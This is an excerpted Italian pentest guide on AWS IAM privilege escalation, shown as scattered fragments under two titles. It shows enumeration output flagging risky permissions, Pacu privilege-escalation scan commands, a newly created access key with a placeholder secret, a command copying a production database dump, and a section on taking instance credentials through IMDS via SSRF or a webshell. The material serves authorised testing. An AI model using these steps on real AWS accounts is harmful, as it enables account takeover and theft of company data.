---
title: 'AWS Privilege Escalation: Tecniche e Misconfigurazioni IAM da Sfruttare'
...
title: "AWS Privilege Escalation: Guida Pentest Completa 2026"

description: "AWS Privilege Escalation: enumerazione IAM, 21+ path di escalation, da utente low-priv ad Admin. Comandi operativi con AWS CLI, Pacu e enumerate-iam."
...
\[+] iam.list\_users() -> SUCCESS

\[+] iam.list\_roles() -> SUCCESS

\[+] iam.create\_policy\_version() -> SUCCESS (!!!)

\[+] lambda.create\_function() -> SUCCESS (!!!)

\[+] lambda.invoke() -> SUCCESS

\[+] ec2.describe\_instances() -> SUCCESS

\[+] s3.list\_buckets() -> SUCCESS

\[+] iam.pass\_role() -> SUCCESS (!!!)
...
import\_keys dev-user

run iam\_\_enum\_permissions

run iam\_\_privesc\_scan
...

{
    ...
    "AccessKey": {
        ...
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCY\_NEW"
...
aws s3 cp s3://corp-backup-prod/db\_dump.sql /tmp/

\`\`\`

\## 4. IMDS e Metadata — Credenziali dalle Istanze

Se hai accesso a un'istanza EC2 (via SSRF, SSH, webshell):
...
export AWS\_ACCESS\_KEY\_ID=ASIAIOSFODNN7TEMP

export AWS\_SECRET\_ACCESS\_KEY=tempSecret...

export AWS\_SESSION\_TOKEN=FwoGZXIvY...
...
\| Pacu scan | \`run iam\_\_privesc\_scan\` |
